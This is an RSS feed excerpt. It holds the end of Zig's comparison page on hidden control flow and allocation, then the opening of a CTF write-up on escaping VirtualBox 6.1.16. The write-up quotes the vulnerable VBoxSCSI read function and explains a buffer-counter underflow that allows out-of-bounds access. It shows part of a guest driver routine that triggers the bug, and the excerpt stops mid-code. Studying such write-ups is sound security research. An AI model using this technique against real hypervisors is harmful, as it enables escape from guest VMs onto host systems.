&lt;code class=&quot;language-zig&quot; data-lang=&quot;zig&quot;&gt;&lt;span&gt;var&lt;/span&gt; a &lt;span&gt;=&lt;/span&gt; b &lt;span&gt;+&lt;/span&gt; c.d;
foo();
bar();
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Examples of hidden control flow:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;D has &lt;code&gt;@property&lt;/code&gt; functions, which are methods that you call with what looks like field access, so in the above example, &lt;code&gt;c.d&lt;/code&gt; might call a function.&lt;/li&gt;
&lt;li&gt;C++, D, and Rust have operator overloading, so the &lt;code&gt;+&lt;/code&gt; operator might call a function.&lt;/li&gt;
&lt;li&gt;C++, D, and Go have throw/catch exceptions, so &lt;code&gt;foo()&lt;/code&gt; might throw an exception, and prevent &lt;code&gt;bar()&lt;/code&gt; from being called. (Of course, even in Zig &lt;code&gt;foo()&lt;/code&gt; could deadlock and prevent &lt;code&gt;bar()&lt;/code&gt; from being called, but that can happen in any Turing-complete language.)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The purpose of this design decision is to improve readability.&lt;/p&gt;
&lt;h2 id=&quot;no-hidden-allocations&quot;&gt;No hidden allocations&lt;/h2&gt;
&lt;p&gt;Zig has a hands-off approach when it comes to heap allocation. There is no &lt;code&gt;new&lt;/code&gt; keyword or any other language feature that uses a heap allocator (e.g. string concatenation operator[1]). The entire concept of the heap is managed by library and application code, not by the language.&lt;/p&gt;
&lt;p&gt;Examples of hidden allocations:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Go’s &lt;code&gt;defer&lt;/code&gt; allocates memory to a function-local stack. In addition to being an unintuitive way for this control flow to work, it can cause out-of-memory failures if you use &lt;code&gt;defer&lt;/code&gt; inside a loop.&lt;/li&gt;
&lt;li&gt;C++ coroutines allocate heap memory in order to call a coroutine.&lt;/li&gt;
&lt;li&gt;In Go, a function call can cause heap allocation because goroutines allocate small stacks that get resized when the call stack gets deep enough.&lt;/li&gt;
&lt;li&gt;The main Rust standard library APIs panic on out of memory conditions, and the alternate APIs that accept allocator parameters are an afterthought (see &lt;a href=&quot;https://github.com/rust-lang/rust/issues/29802&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;rust-lang/rust#29802&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Nearly all garbage collected languages have hidden allocations strewn about, since the garbage collector hides the evidence on the cleanup side.&lt;/p&gt;
&lt;p&gt;The main problem with hidden allocations is that it prevents the &lt;em&gt;reusability&lt;/em&gt; of a piece of code, unnecessarily limiting the number of environments that code would be appropriate to be deployed to. Simply put, there exist use cases where one must be able to rely on control flow and function calls to not have the side-effect of memory allocation, therefore a programming language can only serve these use cases if it can realistically provide this guarantee.&lt;/p&gt;
&lt;p&gt;In Zig, there are standard library features that provide and work with heap allocators, but those are optional standard library features, not built into the language itself. If you never initialize a heap allocator, you can be confident your program will not heap allocate.&lt;/p&gt;
&lt;p&gt;Every standard library feature that needs to allocate heap memory accepts an &lt;code&gt;Allocator&lt;/code&gt; parameter in order to do it. This means that the Zig standard library supports freestanding targets. For example &lt;code&gt;std.ArrayList&lt;/code&gt; and &lt;code&gt;std.AutoHashMap&lt;/code&gt; can be used for bare metal programming!&lt;/p&gt;
&lt;p&gt;Custom allocators make manual memory management a breeze. Zig has a debug allocator that maintains memory safety in the face of use-after-free and double-free. It automatically detects and prints stack traces of memory leaks. There is an arena allocator so that you can bundle any number of allocations into one and free them all at once rather than manage each allocation independently. Special-purpose allocators can be used to improve performance or memory usage for any particular application’s needs.&lt;/p&gt;
&lt;p&gt;[1]: Actually there is a string concatenation operator (generally an array concatenation operator), but it only works at compile time, so there’s still no runtime heap allocation with that.&lt;/p&gt;
&lt;h2 id=&quot;first-class-support-for-no-standard-library&quot;&gt;First-class support for no standard library&lt;/h2&gt;
&lt;p&gt;As hinted above, Zig has an entirely optional standard library. Each std lib API only gets compiled into your program if you use it. Zig has equal support for either linking against libc or not linking against it. Zig is friendly to bare-metal and high-performance development.&lt;/p&gt;
&lt;p&gt;It’s the best of both worlds; for example in Zig, WebAssembly programs can both use the normal features of the standard library, and still result in the tiniest binaries when compared to other programming languages that support compiling to WebAssembly.&lt;/p&gt;
&lt;h2 id=&quot;a-portable-language-for-libraries&quot;&gt;A Portable Language for Libraries&lt;/h2&gt;
&lt;p&gt;One of the holy grails of programming is code reuse. Sadly, in practice, we find ourselves re-inventing the wheel many times over again. Often it’s justified.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;If an application has real-time requirements, then any library that uses garbage collection or any other non-deterministic behavior is disqualified as a dependency.&lt;/li&gt;
&lt;li&gt;If a language makes it too easy to ignore errors, and thus to verify that a library correctly handles and bubbles up errors, it can be tempting to ignore the library and re-implement it, knowing that one handled all the relevant errors correctly. Zig is designed such that the laziest thing a programmer can do is handle errors correctly, and thus one can be reasonably confident that a library will properly bubble errors up.&lt;/li&gt;
&lt;li&gt;Currently it is pragmatically true that C is the most versatile and portable language. Any language that does not have the ability to interact with C code risks obscurity. Zig is attempting to become the new portable language for libraries by simultaneously making it straightforward to conform to the C ABI for external functions, and introducing safety and language design that prevents common bugs within the implementations.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;a-package-manager-and-build-system-for-existing-projects&quot;&gt;A Package Manager and Build System for Existing Projects&lt;/h2&gt;
&lt;p&gt;Zig is a programming language, but it also ships with a build system and package manager that are intended to be useful even in the context of a traditional C/C++ project.&lt;/p&gt;
&lt;p&gt;Not only can you write Zig code instead of C or C++ code, but you can use Zig as a replacement for autotools, cmake, make, scons, ninja, etc. And on top of this, it (will) provide a package manager for native dependencies. This build system is intended to be appropriate even if the entirety of a project’s codebase is in C or C++.&lt;/p&gt;
&lt;p&gt;System package managers such as apt-get, pacman, homebrew, and others are instrumental for end user experience, but they can be insufficient for the needs of developers. A language-specific package manager can be the difference between having no contributors and having dozens. For open source projects, the difficulty of getting the project to build at all is a huge hurdle for potential contributors. For C/C++ projects, having dependencies can be fatal, especially on Windows, where there is no package manager. Even when just building Zig itself, most potential contributors have a difficult time with the LLVM dependency. Zig is (will be) offering a way for projects to depend on native libraries directly - without depending on the users' system package manager to have the correct version available, and in a way that is practically guaranteed to successfully build projects on the first try regardless of what system is being used and independent of what platform is being targeted.&lt;/p&gt;
&lt;p&gt;Zig is offering to replace a project’s build system with a reasonable language using a declarative API for building projects, that also provides package management, and thus the ability to actually depend on other C libraries. The ability to have dependencies enables higher level abstractions, and thus the proliferation of reusable high-level code.&lt;/p&gt;
&lt;h2 id=&quot;simplicity&quot;&gt;Simplicity&lt;/h2&gt;
&lt;p&gt;C++, Rust, and D have a large number of features and it can be distracting from the actual meaning of the application you are working on. One finds themselves debugging their knowledge of the programming language instead of debugging the application itself.&lt;/p&gt;
&lt;p&gt;Zig has no macros and no metaprogramming, yet still is powerful enough to express complex programs in a clear, non-repetitive way. Even Rust which has macros special cases &lt;code&gt;format!&lt;/code&gt;, implementing it in the compiler itself. Meanwhile in Zig, the equivalent function is implemented in the standard library with no special case code in the compiler.&lt;/p&gt;

&lt;p&gt;Zig can be downloaded from &lt;a href=&quot;https://ziglang.org/download/&quot;&gt;the downloads section&lt;/a&gt;. Zig provides binary archives for Linux, Windows, macOS and FreeBSD. The following describes what you get with this archive:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;installed by downloading and extracting a single archive, no system configuration needed&lt;/li&gt;
&lt;li&gt;statically compiled so there are no runtime dependencies&lt;/li&gt;
&lt;li&gt;uses the mature well-supported LLVM infrastructure which enables deep optimization and support for most major platforms&lt;/li&gt;
&lt;li&gt;out of the box cross-compilation to most major platforms&lt;/li&gt;
&lt;li&gt;ships with source code for libc that will be dynamically compiled when needed for any supported platform&lt;/li&gt;
&lt;li&gt;includes build system with caching&lt;/li&gt;
&lt;li&gt;compiles C and C++ code with libc support&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Fri, 15 Jan 2021 21:52:19 +0000</pubDate>
<dc:creator>mardiyah</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://ziglang.org/learn/why_zig_rust_d_cpp/</dc:identifier>
</item>
<item>
<title>Escaping VirtualBox 6.1: Part 1</title>
<link>https://secret.club/2021/01/14/vbox-escape.html</link>
<guid isPermaLink="true" >https://secret.club/2021/01/14/vbox-escape.html</guid>
<description>&lt;time datetime=&quot;2021-01-14T23:00:00+00:00&quot; itemprop=&quot;datePublished&quot; class=&quot;mono&quot;&gt;Jan 14, 2021&lt;/time&gt;&lt;hr/&gt;&lt;p&gt;This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team &lt;a href=&quot;https://twitter.com/Sauercl0ud&quot;&gt;Sauercl0ud&lt;/a&gt; as part of the &lt;a href=&quot;https://realworldctf.com/&quot;&gt;RealWorld CTF 2020/2021&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited.&lt;/p&gt;
&lt;p&gt;Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, &lt;a href=&quot;https://twitter.com/M4x_1997&quot;&gt;M4x&lt;/a&gt; for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all &lt;a href=&quot;https://secret.club/2021/01/14/vbox-escape.html#credits&quot;&gt;the people involved&lt;/a&gt; in writing the exploit.&lt;/p&gt;
&lt;p&gt;Let’s get to some pwning :D&lt;/p&gt;

&lt;p&gt;The challenge description already hints at where a bug might be:&lt;/p&gt;
&lt;blockquote readability=&quot;21&quot;&gt;
&lt;p&gt;Goal:&lt;/p&gt;
&lt;p&gt;Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system.&lt;/p&gt;
&lt;p&gt;You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.&lt;/p&gt;
&lt;p&gt;But you can’t do anything in the host, including modifying the guest configuration file, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hint: SCSI controller is enabled and marked as bootable.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Environment:&lt;/p&gt;
&lt;p&gt;In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;VirtualBox:6.1.16-140961-Win_x64.&lt;/li&gt;
&lt;li&gt;Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64.&lt;/li&gt;
&lt;li&gt;Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64.&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;The only special thing about the VM is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; driver is loaded and marked bootable so that’s the place for us to start looking for vulnerabilities.&lt;/p&gt;
&lt;p&gt;Here are the operations the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; device supports:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// /src/VBox/Devices/Storage/DevBusLogic.cpp&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; (&lt;/code&gt;fBootable)
    {
        &lt;span class=&quot;cm&quot;&gt;/* Register I/O port space for BIOS access. */&lt;/span&gt;
        rc &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*cPorts*/&lt;/span&gt;, &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*fFlags*/&lt;/span&gt;,
                                           buslogicR3BiosIoPortWrite,       &lt;span class=&quot;c1&quot;&gt;// Write a byte&lt;/span&gt;
                                           buslogicR3BiosIoPortRead,        &lt;span class=&quot;c1&quot;&gt;// Read a byte&lt;/span&gt;
                                           buslogicR3BiosIoPortWriteStr,    &lt;span class=&quot;c1&quot;&gt;// Write a string&lt;/span&gt;
                                           buslogicR3BiosIoPortReadStr,     &lt;span class=&quot;c1&quot;&gt;// Read a string&lt;/span&gt;
                                           &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*pvUser*/&lt;/span&gt;,
                                           &lt;span class=&quot;s&quot;&gt;&quot;BusLogic BIOS&quot;&lt;/span&gt; , &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*paExtDesc*/&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;pThis&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;hIoPortsBios);
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    }
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.&lt;/p&gt;
&lt;p&gt;While auditing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vboxscsiReadString&lt;/code&gt; function, &lt;a href=&quot;https://twitter.com/_tsuro&quot;&gt;tsuro&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/__spq__&quot;&gt;spq&lt;/a&gt; found something interesting:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// src/VBox/Devices/Storage/VBoxSCSI.cpp&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * @retval VINF_SUCCESS
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; vboxscsiReadString&lt;/code&gt;(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; iRegister,
                       &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pbDst, &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pcTransfers, &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; cb)
{
    RT_NOREF(pDevIns);
    LogFlowFunc((&lt;span class=&quot;s&quot;&gt;&quot;pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;,
                 pDevIns, pVBoxSCSI, iRegister, &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pcTransfers, cb));

    &lt;span class=&quot;cm&quot;&gt;/*
     * Check preconditions, fall back to non-string I/O handler.
     */&lt;/span&gt;
    Assert(&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pcTransfers &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;);

    &lt;span class=&quot;cm&quot;&gt;/* Read string only valid for data in register. */&lt;/span&gt;
    AssertMsgReturn(iRegister &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;, (&lt;span class=&quot;s&quot;&gt;&quot;Hey! Only register 1 can be read from with string!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;), VINF_SUCCESS);

    &lt;span class=&quot;cm&quot;&gt;/* Accesses without a valid buffer will be ignored. */&lt;/span&gt;
    AssertReturn(pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;pbBuf, VINF_SUCCESS);

    &lt;span class=&quot;cm&quot;&gt;/* Check state. */&lt;/span&gt;
    AssertReturn(pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;enmState &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS);
    Assert(&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;fBusy);

    RTCritSectEnter(&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;CritSect);
    &lt;span class=&quot;cm&quot;&gt;/*
     * Also ignore attempts to read more data than is available.
     */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; cbTransfer &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pcTransfers &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; cb;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; (pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBufLeft &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;)
    {
        Assert(cbTransfer &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBuf);     &lt;span class=&quot;c1&quot;&gt;// --- [1] ---&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; (cbTransfer &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBuf)
        {
            memset(pbDst &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBuf, &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;, cbTransfer &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBuf);
            cbTransfer &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBuf;  &lt;span class=&quot;cm&quot;&gt;/* Ignore excess data (not supposed to happen). */&lt;/span&gt;
        }

        &lt;span class=&quot;cm&quot;&gt;/* Copy the data and adance the buffer position. */&lt;/span&gt;
        memcpy(pbDst, 
               pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;pbBuf &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;iBuf,  &lt;span class=&quot;c1&quot;&gt;// --- [2] ---&lt;/span&gt;
               cbTransfer);

        &lt;span class=&quot;cm&quot;&gt;/* Advance current buffer position. */&lt;/span&gt;
        pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;iBuf      &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; cbTransfer;
        pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBufLeft &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; cbTransfer;         &lt;span class=&quot;c1&quot;&gt;// --- [3] ---&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* When the guest reads the last byte from the data in buffer, clear
           everything and reset command buffer. */&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; (pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;cbBufLeft &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;)              &lt;span class=&quot;c1&quot;&gt;// --- [4] ---&lt;/span&gt;
            vboxscsiReset(pVBoxSCSI, &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*fEverything*/&lt;/span&gt;);
    }
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    {
        AssertFailed();
        memset(pbDst, &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, cbTransfer);
    }
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pcTransfers &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;;
    RTCritSectLeave(&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;pVBoxSCSI&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;CritSect);

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; VINF_SUCCESS;
}
&lt;/pre&gt;
&lt;p&gt;We can fully control &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbTransfer&lt;/code&gt; in this function. The function initially makes sure that we’re not trying to read more than the buffer size &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;. Then, it copies &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbTransfer&lt;/code&gt; bytes from the global buffer into another buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;, which will be sent to the guest driver. Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbTransfer&lt;/code&gt; bytes get subtracted from the remaining size of the buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.&lt;/p&gt;
&lt;p&gt;So much for the logic, but what’s the issue here? There is a check at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer &lt;strong&gt;has left&lt;/strong&gt;. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; to underflow and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbBufLeft&lt;/code&gt; will be set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UINT32_MAX-1&lt;/code&gt;. This same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbBufLeft&lt;/code&gt; will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.&lt;/p&gt;

&lt;p&gt;We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. &lt;a href=&quot;https://twitter.com/fktio&quot;&gt;malle&lt;/a&gt; got to building VirtualBox from source in order for us to have symbols and a debuggable process while &lt;a href=&quot;https://twitter.com/0x4d5aC&quot;&gt;0x4d5a&lt;/a&gt; came up with the idea of using the &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HEVD&lt;/a&gt; driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.&lt;/p&gt;
&lt;p&gt;Here’s how we triggered the bug:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; exploit&lt;/code&gt;() {
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; cdb[&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; {&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;};
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x434&lt;/span&gt;;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; buffer_size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;;

    &lt;span class=&quot;c1&quot;&gt;// reset the state machine&lt;/span&gt;
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;);

    &lt;span class=&quot;c1&quot;&gt;// initiate a write operation&lt;/span&gt;
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;); &lt;span class=&quot;c1&quot;&gt;// TargetDevice (0)&lt;/span&gt;
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;); &lt;span class=&quot;c1&quot;&gt;// direction (to device)&lt;/span&gt;
    
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, ((buffer_size &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;) &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;) &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; (&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;(cdb) &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;)); &lt;span class=&quot;c1&quot;&gt;// buffer length hi &amp;amp; cdb length&lt;/span&gt;
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, buffer_size);                                        &lt;span class=&quot;c1&quot;&gt;// bugger length low&lt;/span&gt;
    __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, buffer_size &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;);                                   &lt;span class=&quot;c1&quot;&gt;// buffer length mid&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;; i &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;(cdb); i&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;)
        __outbyte(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;, cdb[i]);


    &lt;span class=&quot;c1&quot;&gt;// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; buf[buffer_size];
    __inbytestring(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;, buf, buffer_size &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;)    &lt;span class=&quot;c1&quot;&gt;// Read bufsize-1&lt;/span&gt;
    __inbytestring(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;, buf, &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;)                  &lt;span class=&quot;c1&quot;&gt;// Read 9 more bytes&lt;/span&gt;

